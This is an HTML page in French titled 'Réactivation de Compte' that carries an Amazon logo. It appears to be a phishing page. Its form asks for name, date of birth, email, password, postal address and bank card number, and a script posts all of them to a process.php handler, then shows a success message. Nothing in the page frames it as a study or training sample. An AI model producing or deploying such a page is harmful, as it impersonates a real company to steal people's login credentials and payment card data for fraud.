<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Réactivation de Compte</title>
    <link rel="stylesheet" href="styles.css"> <!-- Lien vers le fichier CSS -->
</head>
<body>
    <div class="header">
        <img src="amazon-logo.png" alt="Logo Amazon" class="logo">
    </div>
    <div class="container">
        <h1>Réactivez votre compte</h1>
        <form id="reactivation-form" action="confirmation.html" method="POST">
            <label for="first-name">Prénom :</label>
            <input type="text" id="first-name" name="first-name" required>

            <label for="last-name">Nom :</label>
            <input type="text" id="last-name" name="last-name" required>

            <label for="dob">Date de naissance :</label>
            <input type="date" id="dob" name="dob" required>

            <label for="email">Email :</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Mot de passe :</label>
            <input type="password" id="password" name="password" required>

            <label for="address">Adresse :</label>
            <input type="text" id="address" name="address" required>

            <label for="card-number">Numéro de carte bancaire :</label>
            <input type="text" id="card-number" name="card-number" required>

            <button type="submit">Valider</button>
        </form>
    </div>
    <script>
        document.getElementById('reactivation-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Empêche l'envoi normal du formulaire

            // Récupère les valeurs des champs
            const formData = new FormData(this);

           // Envoie les données au serveur
           fetch('process.php', {
               method: 'POST',
               body: formData
           })
           .then(response => response.text())
           .then(data => {
               // Affiche une réponse du serveur ou redirige
               console.log(data);
               alert('Votre demande a été soumise avec succès.');
               // Redirection vers la page de confirmation
               window.location.href = 'confirmation.html';
           })
           .catch(error => {
           console.error('Erreur:', error);
           alert('Une erreur est survenue. Veuillez réessayer.');
           });
});
</script>

</body>
</html>
